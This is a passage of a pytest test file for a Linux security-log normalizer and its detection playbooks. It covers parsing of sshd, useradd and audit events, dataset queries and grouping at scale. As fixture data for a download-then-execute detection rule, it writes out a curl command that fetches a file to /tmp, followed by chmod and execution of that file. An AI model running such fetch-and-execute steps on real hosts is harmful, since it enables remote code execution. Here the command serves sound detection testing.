        ts=int(sudo["__REALTIME_TIMESTAMP"]) / 1e6)])
    assert _views(got) == _views(dev) and got[0].outcome.value == "failure"


def test_shipper_parsed_invalid_user_is_not_a_valid_user():
    got, _ = _events([fx.parsed_syslog("sshd", 99, {"system.auth.ssh.event": "Invalid", "user.name": "test",
                                                    "source.ip": "198.51.100.4"})])
    assert got[0].get("auth.user_valid") is False and got[0].get("auth.phase") == "user_lookup"


@pytest.mark.parametrize("hit", [
    fx.syslog("useradd", 6995, "new user: name=apache, UID=48, GID=48, home=/usr/share/httpd, shell=/sbin/nologin"),
    fx.parsed_syslog("useradd", 6995, {"user.target.name": "apache", "user.target.id": "48", "group.id": "48"}),
    fx.parsed_syslog("useradd", 6995, {"user.name": "apache", "user.id": "48", "group.id": "48"}),
])
def test_useradd_lines_are_account_creation_records(hit):
    got, _ = _events([hit])
    assert [(e.family, e.get("account.action"), e.get("account.name"), e.get("account.id"), e.host)
            for e in got] == [("account_change", "create_user", "apache", "48", fx.HOST)]


def test_groupadd_line_is_a_group_creation_record():
    got, _ = _events([fx.syslog("groupadd", 6991, "new group: name=apache, GID=48")])
    assert [(e.family, e.get("account.action"), e.get("account.name")) for e in got] == [
        ("account_change", "create_group", "apache")]


def test_other_syslog_identifiers_are_counted_by_identifier():
    events, skips = _events([fx.syslog("cron", 77, "(root) CMD (run-parts /etc/cron.hourly)",
                                       dataset="system.syslog")])
    assert not events and skips == {"syslog identifier 'cron' is not normalized": 1}


def test_journald_audit_copy_without_source_time_is_counted_not_paired():
    events, skips = _events([fx.journald(fx.audit_copy_journal())])
    assert not events and skips == {JOURNAL_COPY_UNKEYED: 1}
    dev_events, dev_skips = _events([fx.dev_journal(fx.audit_copy_journal())])
    assert not dev_events and list(dev_skips) == ["journal copy of an audit record (normalized from linux.audit)"]


def test_journald_boot_observations_come_from_the_boot_id_at_the_receive_time():
    from romulus.evidence.normalize import BootIntervals
    boots = BootIntervals()
    normalize_hits([fx.journald(fx.sshd_journal())], boots)
    spans = boots.spans[fx.HOST]
    assert list(spans) == [fx.BOOT]


def test_apache_shipper_zone_and_host_name_clients():
    error = fx.hit({"@timestamp": "2024-11-18T14:00:00Z", "host": {"name": fx.HOST}, "message": "AH01630: denied",
                    "event": {"dataset": "apache.error", "timezone": "+01:00"}}, "ae")
    access = fx.hit({"@timestamp": "2024-11-18T14:00:00Z", "host": {"name": fx.HOST},
                     "source": {"domain": "client.example"}, "http": {"request": {"method": "GET"},
                                                                       "response": {"status_code": 200}},
                     "url": {"original": "/"}, "event": {"dataset": "apache.access"}}, "aa")
    events, _ = _events([error, access])
    by = {e.family: e for e in events}
    assert "Zone from the shipper's locale" in by["web_error"].caveats
    assert not by["http_access"].has("source.ip")


# ---------------------------------------------------------------------------------------------------------------
# Rules see the same activity in the Agent's field-only shape
# ---------------------------------------------------------------------------------------------------------------

def _rule(name):
    return next(cls for cls in ALL_PLAYBOOKS if cls.id == name)


def _run(rule_id, events, tmp_path):
    detector, stage = _rule(rule_id)(), {}
    detector.spill_dir = tmp_path
    out = list(detector.consume(events))
    stage.update({e.id: e for e in detector.drain_staged()})
    detector.bind_loader(lambda ids: [stage[i] for i in ids if i in stage])
    out += list(detector.finalize())
    return sorted((m.playbook_id, m.proposed_lane, len(m.events)) for m in out)


RULE_ACTIVITIES = {
    "host.download_then_execute": lambda: [
        *fx.exec_lines(argv=["curl", "-o", "/tmp/x", "http://203.0.113.5/x"]), *fx.chmod_lines(),
        *fx.exec_lines(ts=fx.T0 + 9.0, serial=160, argv=["/tmp/x"], exe="/tmp/x", pid=4050, ppid=4000)],
    "host.credential_material_access": fx.shadow_lines,
    "host.kernel_module_load": fx.insmod_lines,
    "host.ssh_login_external_source": fx.login_lines,
    "host.account_or_group_change": fx.useradd_lines,
}


@pytest.mark.parametrize("rule_id", sorted(RULE_ACTIVITIES))
def test_rules_find_the_same_in_the_agent_field_shape(rule_id, tmp_path):
    lines = RULE_ACTIVITIES[rule_id]()
    dev, _ = _events(fx.dev_audit(lines))
    agent, _ = _events(fx.agent_audit(lines))
    want = _run(rule_id, dev, tmp_path / "dev")
    assert want, rule_id
    assert _run(rule_id, agent, tmp_path / "agent") == want


# ---------------------------------------------------------------------------------------------------------------
# Retrieval, inventory and blind spots
# ---------------------------------------------------------------------------------------------------------------

WINDOW = Window(start=datetime(2024, 11, 18, 14, tzinfo=UTC), end=datetime(2024, 11, 18, 15, tzinfo=UTC))


def _contract(**extra):
    return contract_from_types("linux-x", {"@timestamp": "date", "event.dataset": "keyword",
                                           "data_stream.dataset": "constant_keyword", "host.name": "keyword",
                                           **extra})


def _clause(contract, logical):
    intent = SearchIntent(kind="raw", target="linux-x", window=WINDOW,
                          filters=[Predicate(field="event.dataset", op="in", value=[logical])])
    return compile_es(intent, contract).body["query"]["bool"]["filter"][1]


@pytest.mark.parametrize("logical", sorted(LINUX_SHIPPER_DATASETS))
def test_a_logical_dataset_query_names_every_shipper_name_on_both_dataset_fields(logical):
    clause = json.dumps(_clause(_contract(**{"event.module": "keyword", "input.type": "keyword"}), logical))
    for name in shipper_names([logical]):
        for field in ("event.dataset", "data_stream.dataset"):
            assert f'"{field}"' in clause and f'"{name}"' in clause, (logical, name, field)
    if logical == "linux.audit":
        assert '"event.module": "auditd"' in clause
    if logical == "systemd.journal":
        assert '"input.type": "journald"' in clause and '"must_not"' in clause


def test_shapes_needing_an_unmapped_field_are_left_out_and_listed():
    clause = json.dumps(_clause(_contract(), "systemd.journal"))
    assert "input.type" not in clause
    audit = json.dumps(_clause(_contract(), "linux.audit"))
    assert '"auditd"' not in audit and '"auditd.log"' in audit

    class Fake:
        _note_linux_shapes = sw.Sweep._note_linux_shapes

        def __init__(self):
            self.stats: dict = {}
            self._profiles = {"linux-x": {"datasets": {"auditd.log": 9, "journald.logs": 3}}}

    fake = Fake()
    filters = sw.Sweep._filters_for(fake, "linux-x", _contract())
    assert filters[0].value == list(sw.LINUX_HOST_DATASETS)
    assert "auditd" not in fake.stats["dataset_filter"]["linux-x"]
    assert fake.stats["linux_shipper_inventory"]["linux-x"] == {"linux.audit": {"auditd.log": 9},
                                                                "systemd.journal": {"journald.logs": 3}}
    assert {item.split(":")[0] for item in fake.stats["linux_shapes_not_assessed"]["linux-x"]} == {
        "auditd+event.module", "input.type", "event.module"}


def test_an_auditd_log_only_inventory_delivers_the_audit_families():
    profile = {"role": "host", "os_family": "linux", "datasets": {"auditd.log": 1000}, "notes": []}
    families = sw.delivered_families(profile, None)
    assert {"process_exec", "net_socket", "file_change", "file_access", "kernel_module"} <= families
    assert exec_capable_dataset("auditd.log") and exec_capable_dataset("linux.audit.socket")
    assert not exec_capable_dataset("system.auth")
    assert "linux.audit" in with_logical(["auditd.log"])


def test_shape_dispatch():
    assert match_shape({"event": {"dataset": "auditd", "module": "auditd"}})[0] == "linux.audit"
    assert match_shape({"event": {"dataset": "auditd", "module": "other"}}) is None
    assert match_shape({"input": {"type": "journald"}})[0] == "systemd.journal"
    assert match_shape({"event": {"module": "auditd"}})[0] == "linux.audit"
    assert match_shape({"event": {"module": "system"}}) is None
    assert match_shape({"data_stream": {"dataset": "system.auth"}})[0] == "linux.syslog"


def test_unlisted_linux_dataset_is_counted_not_normalized_with_its_families():
    weird = fx.hit({"@timestamp": "2024-11-18T14:00:00Z", "event": {"dataset": "auditd.weird", "module": "auditd"},
                    "message": "x"}, "w")
    other = fx.hit({"@timestamp": "2024-11-18T14:00:00Z", "event": {"dataset": "nginx.access"}}, "n")
    fed: dict = {}
    events, skips, errors = normalize_hits([weird], skip_families=fed)
    assert not events and not errors
    assert skips == {"dataset:auditd.weird is not normalized": 1}
    assert fed["dataset:auditd.weird is not normalized"] == sw.DATASET_FAMILIES["linux.audit"]
    fed = {}
    normalize_hits([other], skip_families=fed)
    assert fed == {"dataset:nginx.access is not normalized": None}
    assert unmatched_families({"input": {"type": "journald"}, "event": {"dataset": "x"}}) == frozenset(
        sw.DATASET_FAMILIES["systemd.journal"])


EVE_TYPES = {
    "alert": {"alert": {"signature_id": 2000001, "signature": "ET TEST", "severity": 1}},
    "flow": {"flow": {"pkts_toserver": 3, "bytes_toserver": 180, "start": "2024-11-18T14:00:00.000000+0000"}},
    "dns": {"dns": {"type": "query", "rrname": "example.invalid", "rrtype": "A"}},
    "http": {"http": {"hostname": "example.invalid", "url": "/", "http_method": "GET", "status": 200}},
    "tls": {"tls": {"sni": "example.invalid", "version": "TLS 1.2"}},
    "fileinfo": {"fileinfo": {"filename": "/x", "size": 10}},
    "ssh": {"ssh": {"client": {"software_version": "OpenSSH_9.6"}}},
}


@pytest.mark.parametrize("event_type", sorted(EVE_TYPES))
def test_suricata_eve_without_its_json_record_is_an_error_not_a_silent_drop(event_type):
    # Filebeat/Agent Suricata documents keep the EVE fields under suricata.eve.* and Fleet removes event.original:
    # the EVE normalizer reads the JSON record only, so such a document is an error that marks rules partial.
    doc = fx.hit({"@timestamp": "2024-11-18T14:00:00Z", "event": {"dataset": "suricata.eve", "module": "suricata"},
                  "suricata": {"eve": {"event_type": event_type, "flow_id": 1, **EVE_TYPES[event_type]}},
                  "source": {"ip": "10.0.0.1", "port": 1}, "destination": {"ip": "10.0.0.2", "port": 80},
                  "network": {"transport": "tcp"}}, "s")
    events, skips, errors = normalize_hits([doc])
    assert not events and not skips and errors
    assert sw._error_tag(errors[0][1]) == "suricata.eve"


# ---------------------------------------------------------------------------------------------------------------
# Scale: rebuilt records join the existing bounded grouping
# ---------------------------------------------------------------------------------------------------------------

def test_rebuilt_records_group_within_the_partition_bound():
    events_total, records_total = 50_000, 200_000
    template = fx.agent_audit(fx.connect_lines())[:2]
    proctitle = fx.agent_audit(fx.connect_lines())[2]
    batch_events = sw.PARTITION_MAX_DOCS // 4
    made = 0
    seen_events = 0
    largest_group_table = 0
    while made < records_total:
        hits = []
        for index in range(made // 4, min(made // 4 + batch_events, events_total)):
            for part, base in enumerate((*template, proctitle, template[0])):
                doc = json.loads(json.dumps(base["_source"]))
                doc["auditd"]["log"]["sequence"] = 1_000_000 + index
                if part == 3:
                    doc["auditd"]["log"]["record_type"] = "CWD"
                    doc["process"] = {"working_directory": "/tmp"}
                hits.append({"_index": "linux-x", "_id": f"r{index}-{part}", "_source": doc})
        made += len(hits)
        assert len(hits) <= sw.PARTITION_MAX_DOCS
        groups, errors = group_audit(hits)
        assert not errors
        largest_group_table = max(largest_group_table, len(groups))
        assert all(len(members) == 4 for members in groups.values())
        events, _skips, errors = normalize_hits(hits, surrogate_free=True)
        assert not errors
        seen_events += sum(e.family == "net_socket" for e in events)
    assert made == records_total and seen_events == events_total
    # one group per event of the partition, never more than the partition's records
    assert largest_group_table <= sw.PARTITION_MAX_DOCS // 4
